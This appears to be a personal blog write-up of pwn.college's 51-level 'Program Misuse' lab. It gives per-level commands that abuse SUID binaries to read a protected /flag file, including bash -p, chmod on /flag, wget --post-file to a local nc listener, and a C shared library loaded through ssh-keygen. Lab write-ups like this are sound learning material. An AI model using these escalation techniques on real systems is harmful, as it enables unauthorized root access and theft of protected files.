---
title: Program Misuse [51/51] | Fundamentals Dojo
description: Program Misuse [51/51] | Fundamentals Dojo
publishDate: 19 Feb 2024
tags:
- ctf
pinned: false
draft: false
---

In pwn.college "Program Misuse" it covered the privilege escalation of binary tools when they are assigned with too many privileges like SUID. Here is how I tackled all 51 flags. 

## What is SUID and GUID
SUID (Set owner User ID up on execution) and GUID (Set owner up on Group ID up on execution) are permissions set on binary execution. These permissions when assigned to binary tools can be exploited to escalate privileges (launching a root shell).

## Enumeration
To detect of privileges have SUID and GUID Privileges:

> SUID – The “s” in the fourth character specifies SUID bit is set. This binary will execute as the root user which is the owner user of the binary.[^source1]

> GUID – The “s” in seventh character specifies that GUID bit is set. This binary will execute as the root group which is the owner group of the binary. [^source1]

To find binaries with SUID/GUID:

SUID : 
```find / -perm -4000 -type f -ls 2>/dev/null```

GUID : 
```find / -perm -2000 -type f -ls 2>/dev/null```

## Takeaways
This Fundamentals dojo exposed me to a number of Linux tools and how to use them. The puzzles pushed me to read the manuals of the tools (one that I normally would not bother to read) and familiarized me with a lot of the syntax commonly used.

Some of my solutions could have been improved, but overall, this section has been manageable with some hiccups here and there _(emacs and ssh-keygen)_.

## Solutions 
For puzzles 1-16, I did not cover most solutions as they were pretty straightforward. Most tools were easily understood by reading the manual with ```man [tool]```. I also leave out the flags themselves so as to maintain the spirit of the game.


1. cat
2. more
3. less
4. tail
5. head
6. sort
7. vim
8. emacs (could not run it with GUI due to GTK+ error)
```
emacs -nw (runs without gui)
Ctrl+X, Ctrl+F
/flag
```
9. nano
10. rev 
11. od
12. hd 
```
hd -f /flag
```
13. xxd
14. base32
15. base64
16. split
17. gzip
```
gzip -r /flag OR gzip -v /flag
gzip -d -c /flag.gz
```
18.  bzip2
```
bzip2 /flag
bzip2 -d -c /flag.bz2
```
19. zip
```
zip z /flag
ls -al z.zip // check if file is created
cat z.zip
```
20. tar
```
tar -cf archive.tar /flag
cat archive.tar
```
21. ar
```
ar r archive.a /flag
cat archive.a
```
22. cpio
```
ls /flag | cpio -ov >/home/hacker/archive.cpio
cat archive.cpio
```
23. genisoimage: https://gtfobins.github.io/gtfobins/genisoimage/
```
genisoimage -sort /flag
```
24. env
```
env /usr/bin/cat /flag
```
25. find
```
find /flag -exec "cat" {} \;
```
26. make : https://gtfobins.github.io/gtfobins/make/
```
make -s --eval=$'x:\n\t-'"cat /flag"
```
27. nice
```
nice cat /flag 
```
28. timeout
```
timeout 1 cat /flag
```
29. stdbuf
```
stdbuf -i 0 cat /flag
```
30. setarch: https://man7.org/linux/man-pages/man8/setarch.8.html
```
setarch i386 cat /flag (i386 is AMD64)
```
31. watch
```
watch -x cat /flag
```
32. socat: https://gtfobins.github.io/gtfobins/socat/
```
socat -u "file:/flag" -
```
33. whiptail
```
whiptail --textbox --scroltext "/flag" 10 50
```
34. awk 
```
awk '{print}' /flag
```
35. sed
```
sed "" /flag
```
36. ed
```
ed /flag
,p
```
37. chown
```
chown hacker /flag
```
38. chmod
```
chmod +rwx /flag
```
39. cp
```
cp /flag /home/hacker/stuff.txt
cat stuff.txt
```
40. mv : https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619
```
mv /usr/bin/cat /usr/bin/mv
./babysuid_level40
```
41. perl
```
perl -pe {END} /flag
```
42. python
```
python /flag
```
43. ruby (partial)
```
ruby /flag
{incompleteFlag}
```
44. bash
```
bash -p (privileged mode)
cat /flag
```
45. date
```
date -f /flag
```
46. dmesg
```
dmesg -F /flag
```
47. wc
```
wc --files0-from=/flag
```
48. gcc
```
gcc -x c -E /flag
OR
gcc @/flag
```
49. as
```
as -Z @/flag
```
50. wget
```
wget -i /flag
pwn.college{flag} // Wrong solution, the caps are gotten rid of through verbose error messages)
nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 // Best solution
pwn.college{correctflag}
```
51. ssh-keygen 

Based on the video (Connor's Opening Hours)[^ssh-keygen-source1], I was guided to the solution for lab 51.To discover the option used , we first go through the manual for ssh-keygen ```man ssh-keygen```. With trial and discovery, it is discovered that we cannot run the /flag file directly through the command. However, we could create a program in C (compiled by gcc) that reads the /flag file to trick the command to call the function that appears in the error message. 

```c
#include <stdio.h>
#include <stdlib.h>
int main(){
    printf("Hello World ");
    return 0;
}
// we can also use __attribute__((constructor)) here instead of naming the function C_GetFunctionList to run the function automtically without being called.
int C_GetFunctionList(){
  sendfile(1, open("/flag", 0), 0, 4096);
}
```
Then after, compile the code as a shared library with gcc and use the compiled file on ssh-keygen.
```
gcc -shared 51.c
ssh-keygen -D ./a.out
```

## References
[^source1]: <https://securiumsolutions.com/privilege-escalation-with-suid-in-linux/>
[^ssh-keygen-source1]: Lab 51 Solution : <https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s>
